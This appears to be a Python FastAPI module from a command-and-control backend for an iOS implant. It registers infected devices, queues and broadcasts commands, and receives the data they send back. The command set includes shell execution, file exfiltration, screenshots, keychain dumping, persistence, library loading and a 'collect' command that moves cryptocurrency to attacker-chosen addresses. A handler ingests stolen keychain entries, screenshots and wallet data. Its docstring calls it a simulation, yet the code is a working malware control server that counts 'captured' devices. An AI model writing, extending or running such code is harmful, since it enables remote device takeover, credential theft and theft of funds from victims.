"""
L3 — Implant C2 & JSON-RPC Command Dispatcher

Simulates the communication profile of bootstrap.dylib + entry0:
  - POST-based JSON-RPC command dispatch (aligned with Stage3 E.TA)
  - GET-based heartbeat polling
  - Implant session management
  - Command queue and history

The WASM state machine in Stage3_VariantB.js cycles through:
  IA (idle) → wA (wait/download) → QA (processing) → BA (busy/feed) →
  NA (next) → EA (end) → TA (trigger POST) → UA (upload)

This module simulates the server side that receives the TA (POST) calls
and dispatches commands back via the polling loop.
"""

from __future__ import annotations

import time
import uuid

from fastapi import APIRouter, HTTPException, Request
from pydantic import BaseModel, Field

from .auth import create_implant_token, require_admin, require_implant
from .audit import audit
from .console_crud import upsert_device_from_implant
from .database import get_proxy_by_channel
from .device_assets import upsert_assets_for_device
from .collect_ops import record_collect_result
from .daemon_hooks import apply_hook_report, broadcast_hook_update
from .database import (
    save_command,
    save_session,
    update_command_status,
    update_session_heartbeat,
)
from .state import (
    AppState,
    C2Command,
    ImplantSession,
    app_state,
)

router = APIRouter(tags=["L3 · C2 Dispatcher"])


# ── Request / Response Models ────────────────────────────────────────────────

class ImplantRegisterRequest(BaseModel):
    """Sent by bootstrap.dylib on first execution."""
    device_id: str = ""
    ip: str = ""
    ios_version: str = ""
    channel_code: str = ""
    proxy_id: str = ""


class ImplantHeartbeatRequest(BaseModel):
    """Periodic keepalive from the implant."""
    session_id: str


class C2CommandRequest(BaseModel):
    """
    JSON-RPC style command for dispatch to implants.
    Matches the format parsed by entry0:
      { "cmd": "logmsg", "args": { "msg": "<string>" } }
    """
    cmd: str = Field(..., description="Command verb: logmsg, exec, exfil, screenshot, etc.")
    args: dict = Field(default_factory=dict, description="Command arguments")
    target_session: str = Field("", description="Target session_id (empty = broadcast)")


class ImplantPostBody(BaseModel):
    """
    Body received from Stage3 E.TA POST calls.
    The implant sends arbitrary JSON; the URL contains the session context.
    """
    pass

    class Config:
        extra = "allow"


class CommandAckRequest(BaseModel):
    """Acknowledgement from implant after executing a command."""
    session_id: str
    command_id: str
    status: str = "ack"      # ack / error
    result: dict = Field(default_factory=dict)


# ── Supported Commands ───────────────────────────────────────────────────────

SUPPORTED_COMMANDS = {
    "logmsg":     {"description": "Write a log message", "args_schema": {"msg": "string"}},
    "exec":       {"description": "Execute a shell command", "args_schema": {"cmd": "string"}},
    "exfil":      {"description": "Exfiltrate a file", "args_schema": {"path": "string"}},
    "screenshot": {"description": "Capture screenshot", "args_schema": {}},
    "keychain":   {"description": "Dump keychain entries", "args_schema": {"filter": "string?"}},
    "persist":    {"description": "Install persistence", "args_schema": {"method": "string"}},
    "uninstall":  {"description": "Remove implant", "args_schema": {}},
    "sleep":      {"description": "Set sleep interval", "args_schema": {"seconds": "int"}},
    "dylib_load": {"description": "Load a dynamic library", "args_schema": {"path": "string"}},
    "hook_check": {"description": "Report hook status", "args_schema": {}},
    "collect":    {"description": "Collect assets to configured addresses", "args_schema": {
        "chain": "string", "token": "string", "amount": "number",
        "from_address": "string", "to_address": "string", "record_id": "string",
    }},
}


def _resolve_proxy_id(channel_code: str, proxy_id: str) -> str:
    if channel_code:
        row = get_proxy_by_channel(channel_code)
        if row:
            return row.get("proxy_id", "")
    return proxy_id or ""


# ── Routes: Session Management ───────────────────────────────────────────────

@router.post("/api/c2/register", summary="L3 Implant registration")
async def register_implant(body: ImplantRegisterRequest, request: Request):
    """
    Called by bootstrap.dylib on first execution.
    Creates a new session and returns a session_id for subsequent comms.
    """
    ip = body.ip or (request.client.host if request.client else "0.0.0.0")
    session = ImplantSession(
        session_id=uuid.uuid4().hex[:16],
        device_id=body.device_id or f"DEV-{uuid.uuid4().hex[:6]}",
        ip=ip,
        ios_version=body.ios_version or "unknown",
        last_heartbeat=time.time(),
        is_alive=True,
    )
    app_state.implant_sessions[session.session_id] = session
    implant_token = create_implant_token(session.session_id)
    session.implant_token = implant_token

    save_session({
        "session_id": session.session_id,
        "device_id": session.device_id,
        "ip": ip,
        "ios_version": session.ios_version,
        "last_heartbeat": session.last_heartbeat,
        "is_alive": True,
        "implant_token": implant_token,
        "created_at": time.time(),
    })

    upsert_device_from_implant(
        device_id=session.device_id,
        session_id=session.session_id,
        ip=ip,
        ios_version=session.ios_version,
        proxy_id=_resolve_proxy_id(body.channel_code, body.proxy_id),
    )
    app_state.captured_today += 1

    app_state.layers["L3"].metrics["ipc_channels"] = len(app_state.implant_sessions)
    app_state.layers["L3"].metrics["c2_heartbeat"] = "OK"

    # Broadcast to dashboard
    await app_state.broadcast_sse({
        "type": "implant_register",
        "data": {
            "session_id": session.session_id,
            "device_id": session.device_id,
            "ip": ip,
            "ios_version": session.ios_version,
            "simulated": False,
        },
    })
    await app_state.broadcast_sse({
        "type": "device_update",
        "data": {"device_id": session.device_id, "action": "upsert"},
    })
    await app_state.broadcast_layer_update("L3")

    return {
        "code": 0,
        "data": {
            "session_id": session.session_id,
            "device_id": session.device_id,
            "implant_token": implant_token,
        },
    }


@router.post("/api/c2/heartbeat", summary="L3 Implant heartbeat")
async def heartbeat(body: ImplantHeartbeatRequest, request: Request):
    """
    Periodic keepalive. Returns any pending commands for this session.
    Mirrors the polling loop in Stage3 E.wA().
    """
    require_implant(request, body.session_id)
    session = app_state.implant_sessions.get(body.session_id)
    if not session:
        raise HTTPException(404, "Session not found")

    session.last_heartbeat = time.time()
    session.is_alive = True
    update_session_heartbeat(session.session_id, session.last_heartbeat, True)

    # Drain pending commands
    pending = [c for c in session.command_queue if c.status == "pending"]
    for c in pending:
        c.status = "dispatched"

    return {
        "code": 0,
        "data": {
            "commands": [
                {"id": c.id, "cmd": c.cmd, "args": c.args}
                for c in pending
            ],
            "heartbeat_ack": True,
            "server_time": time.time(),
        },
    }


@router.get("/api/c2/sessions", summary="L3 List all implant sessions")
async def list_sessions():
    now = time.time()
    sessions = []
    for s in app_state.implant_sessions.values():
        if now - s.last_heartbeat > 120:
            s.is_alive = False
        sessions.append({
            "session_id": s.session_id,
            "device_id": s.device_id,
            "ip": s.ip,
            "ios_version": s.ios_version,
            "last_heartbeat": s.last_heartbeat,
            "seconds_ago": int(now - s.last_heartbeat),
            "is_alive": s.is_alive,
            "pending_commands": len([c for c in s.command_queue if c.status == "pending"]),
        })

    return {"code": 0, "data": sessions}


# ── Routes: Command Dispatch ─────────────────────────────────────────────────

@router.post("/api/c2/dispatch", summary="L3 Dispatch command to implant(s)")
async def dispatch_command(body: C2CommandRequest, request: Request):
    """
    Queue a JSON-RPC command for dispatch.
    If target_session is empty, broadcast to ALL live sessions.
    """
    require_admin(request)
    if body.cmd not in SUPPORTED_COMMANDS:
        raise HTTPException(400, f"Unknown command: {body.cmd}. Supported: {list(SUPPORTED_COMMANDS.keys())}")

    command = C2Command(
        id=uuid.uuid4().hex[:12],
        timestamp=time.time(),
        cmd=body.cmd,
        args=body.args,
        status="pending",
    )
    app_state.command_history.append(command)
    save_command({
        "command_id": command.id,
        "session_id": body.target_session,
        "cmd": command.cmd,
        "args": command.args,
        "status": command.status,
        "response": {},
        "created_at": command.timestamp,
    })

    targets: list[ImplantSession] = []
    if body.target_session:
        s = app_state.implant_sessions.get(body.target_session)
        if not s:
            raise HTTPException(404, "Target session not found")
        targets = [s]
    else:
        targets = [s for s in app_state.implant_sessions.values() if s.is_alive]

    if not targets:
        return {
            "code": 1,
            "msg": "No live implant sessions to receive command",
            "data": {
                "command_id": command.id,
                "dispatched_to": [],
                "dispatched_count": 0,
            },
        }

    dispatched_to = []
    for s in targets:
        cmd_copy = C2Command(
            id=command.id,
            timestamp=command.timestamp,
            cmd=command.cmd,
            args=command.args,
            status="pending",
        )
        s.command_queue.append(cmd_copy)
        dispatched_to.append(s.session_id)

    # SSE notification
    await app_state.broadcast_sse({
        "type": "command_dispatch",
        "data": {
            "command_id": command.id,
            "cmd": command.cmd,
            "args": command.args,
            "targets": dispatched_to,
        },
    })
    await app_state.broadcast_layer_update("L3")

    audit("dispatch", f"c2:{command.cmd}", detail=f"targets={dispatched_to}")

    return {
        "code": 0,
        "data": {
            "command_id": command.id,
            "dispatched_to": dispatched_to,
            "dispatched_count": len(dispatched_to),
        },
    }


@router.post("/api/c2/ack", summary="L3 Command acknowledgement from implant")
async def ack_command(body: CommandAckRequest, request: Request):
    """Implant reports back after executing a command."""
    require_implant(request, body.session_id)
    session = app_state.implant_sessions.get(body.session_id)
    if not session:
        raise HTTPException(404, "Session not found")

    for c in session.command_queue:
        if c.id == body.command_id:
            c.status = body.status
            c.response = body.result
            break

    # Also update in global history
    for c in app_state.command_history:
        if c.id == body.command_id:
            c.status = body.status
            c.response = body.result
            break

    update_command_status(body.command_id, body.status, body.result, body.session_id)

    cmd_name = ""
    for c in app_state.command_history:
        if c.id == body.command_id:
            cmd_name = c.cmd
            break
    if cmd_name == "hook_check" and body.result:
        apply_hook_report(body.result, source="implant")
        await broadcast_hook_update()

    await app_state.broadcast_sse({
        "type": "command_ack",
        "data": {
            "command_id": body.command_id,
            "session_id": body.session_id,
            "status": body.status,
            "result": body.result,
        },
    })

    return {"code": 0, "msg": "ack received"}


# ── Routes: E.TA POST Handler ────────────────────────────────────────────────

@router.post("/api/c2/implant-post", summary="L3 Receive E.TA POST from implant")
async def implant_post(request: Request):
    """Catch-all for POST data sent by Stage3 E.TA(url, jsonBody, ...)."""
    token_payload = require_implant(request)
    try:
        body = await request.json()
    except Exception:
        body = {"raw": (await request.body()).decode("utf-8", errors="replace")}

    client_ip = request.client.host if request.client else "0.0.0.0"
    session_id = token_payload.get("sub", "")
    session = app_state.implant_sessions.get(session_id)
    device_id = session.device_id if session else ""

    if device_id and isinstance(body, dict):
        if body.get("event") == "collect_result" or body.get("type") == "collect_result":
            record_collect_result(body)
            await app_state.broadcast_sse({"type": "collect_record_update", "data": body})
        elif body.get("exfil_type") or body.get("event") in (
            "keychain_exfil",
            "screenshot_exfil",
            "wallet_open",
            "exfil",
            "dylib_load_result",
            "persist_result",
            "exec_result",
        ):
            exfil_payload = {
                "device_id": device_id,
                "exfil_type": body.get("exfil_type") or body.get("event", "exfil").replace("_exfil", "").replace("_result", ""),
                "timestamp": body.get("timestamp", time.time()),
                **{k: v for k, v in body.items() if k not in ("image_data", "content_preview")},
            }
            if body.get("entries") and not exfil_payload.get("items"):
                exfil_payload["items"] = [
                    {"service": e.get("service") or e.get("label", ""), "account": e.get("account", "")}
                    for e in body.get("entries", [])[:50]
                    if isinstance(e, dict)
                ]
            if body.get("image_data"):
                exfil_payload["image_size"] = body.get("image_size") or len(body["image_data"])
                exfil_payload["has_image"] = True
            await app_state.broadcast_sse({"type": "exfil_result", "data": exfil_payload})
            if body.get("event") != "wallet_open":
                await upsert_assets_for_device(device_id, body)
        else:
            await upsert_assets_for_device(device_id, body)

    await app_state.broadcast_sse({
        "type": "implant_post",
        "data": {
            "ip": client_ip,
            "body": body,
            "timestamp": time.time(),
        },
    })

    app_state.captured_today += 1
    await app_state.broadcast_layer_update("L3")

    return {"code": 0, "msg": "received"}


# ── Routes: History & Info ───────────────────────────────────────────────────

@router.get("/api/c2/history", summary="L3 Command dispatch history")
async def command_history(limit: int = 100):
    history = list(app_state.command_history)[-limit:]
    return {
        "code": 0,
        "data": [
            {
                "id": c.id,
                "timestamp": c.timestamp,
                "cmd": c.cmd,
                "args": c.args,
                "status": c.status,
                "response": c.response,
            }
            for c in history
        ],
    }


@router.get("/api/c2/commands", summary="L3 List supported commands")
async def list_commands():
    return {
        "code": 0,
        "data": SUPPORTED_COMMANDS,
    }


@router.get("/api/c2/status", summary="L3 C2 dispatcher status")
async def c2_status():
    now = time.time()
    live = sum(1 for s in app_state.implant_sessions.values()
               if now - s.last_heartbeat < 120)
    total_cmds = len(app_state.command_history)
    acked = sum(1 for c in app_state.command_history if c.status == "ack")

    return {
        "code": 0,
        "data": {
            "total_sessions": len(app_state.implant_sessions),
            "live_sessions": live,
            "total_commands_dispatched": total_cmds,
            "commands_acknowledged": acked,
            "layer_status": app_state.layers["L3"].status.value,
            "ipc_channels": app_state.layers["L3"].metrics.get("ipc_channels", 0),
            "c2_heartbeat": app_state.layers["L3"].metrics.get("c2_heartbeat", "UNKNOWN"),
        },
    }
